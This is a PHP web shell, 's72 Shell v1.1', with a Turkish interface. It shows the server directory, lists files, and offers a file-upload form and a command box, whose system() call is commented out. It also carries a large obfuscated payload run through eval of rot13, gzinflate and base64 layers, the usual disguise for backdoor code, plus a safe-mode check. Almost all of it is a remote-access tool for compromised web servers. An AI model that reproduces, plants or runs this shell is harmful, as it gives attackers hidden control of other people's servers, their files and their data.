<html>

<head>
<meta http-equiv="Content-Language" content="tr">
<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
<title>s72 Shell v1.0 Codinf by Cr@zy_King</title>
<meta name="Microsoft Theme" content="refined 011">
</head>

<body background="refbgd2.gif" bgcolor="#000000" text="#FFFFFF" link="#666699" vlink="#999999" alink="#999900">

<!--mstheme--><font face="Times New Roman">

<p><font face="Comic Sans MS" color="#FF0000"><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b>s72 Shell v1.1 Coding by <a href="mailto:crazy_king@turkusev.net">
<font color="#00FF00">Cr@zy_King&nbsp; </font>
</a> </font></p>

      <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
      <font color="#FF0000"><b><font face="Comic Sans MS" size="1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ 
      Server Bilgileri ]</td>
    </tr>
    <tr>
      <td width="49%" height="142">
      </font></b></font>
</p>
      <p align="center">
        <font color="#800080"><b><font face="Verdana" style="font-size: 8pt">
        Dizin</font></b></font><font face="Verdana" style="font-size: 8pt"><font color="#800080"><b>:</b> <? echo $_SERVER['DOCUMENT_ROOT']; ?>
        <br />
        <b>Shell Dizini:</b> <? echo $SCRIPT_FILENAME ?>
        <br>
        &nbsp;</font></font><p align="center"><form method="post">
<p align="center">
<font color="#800080">
<br>
</font><font face="Verdana" style="font-size: 8pt" color="#800080">Buraya 
Kodunuzu Yaz�n :)</font><font color="#111111"><br>
<br>
</font>
<font color="#FF0000">
<textarea size="70" name="command" rows="2" cols="43" ></textarea> <br>
<br><input type="submit" value="�al��t�r!"></font><font color="#FF0000"><br>
&nbsp;<br></font></p>
      </form>
      <p align="center">
        <font color="#FF0000">
        <textarea readonly size="1" rows="7" cols="53"><?php echo "[syslog]01\n"; @$output = "true";//system($_POST['command']); ?></textarea></font><p align="center">
        &nbsp;<p align="center">
              <font color="#FF0000">
              <td width="49%" height="24" bgcolor="#FCFEBA">
              </font>
      <p align="center"><font color="#FF0000"><b>
      <font face="Comic Sans MS" size="1">[ Diziler -_- Dizinler ]</td>
      <td width="51%" height="24" bgcolor="#FCFEBA">
      </font></b></font>
      <form method="post">
<p align="center">
<font face="Verdana" style="font-size: 11pt">
<?
$folder=opendir('./');
while ($file = readdir($folder)) {
if($file != "." && $file != "..")
echo '<a target="_blank" href="'.$file.'">'.$file.'</a ><br>';
}
closedir($folder);
?></p>
      </form>
      <p align="center">
      <br>
        <b><font face="Comic Sans MS" size="1" color="#FF0000">[ Upload ]</font></b></font><font face="Comic Sans MS" size="1"><b><font color="#FF0000"></td></font></b></font><form enctype="multipart/form-data" method="post">
<p align="center"><br>
<br>
<font face="Verdana" style="font-size: 8pt" color="#800080">Buradan Dosya Upload Edebilirsiniz.</font><br>
<br>
<input type="file" name="file" size="20"><br>
<br>
<font style="font-size: 5pt">&nbsp;</font><br>
<input type="submit" value="Y�kle!"> <br>
&nbsp;</p>
</form>
<?php
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
?>
<font face="Verdana" style="font-size: 8pt">
<p align=\"center\"></font>
</td>
        <font color="#111111">
        <br>
        <br>
        <br /><br /> </font>
              <?php 
// Check for Safe Mode
if( ini_get('safe_mode') ) {
   print '<font color=#FF0000><b>G�venlik A��k</b></font>';
} else {
   print '<font color=#008000><b>G�venlik Kapal�</b></font>';
}
echo "[syslog]03\n";
?>

        <!--mstheme--></font>

        </body>
        
</html>
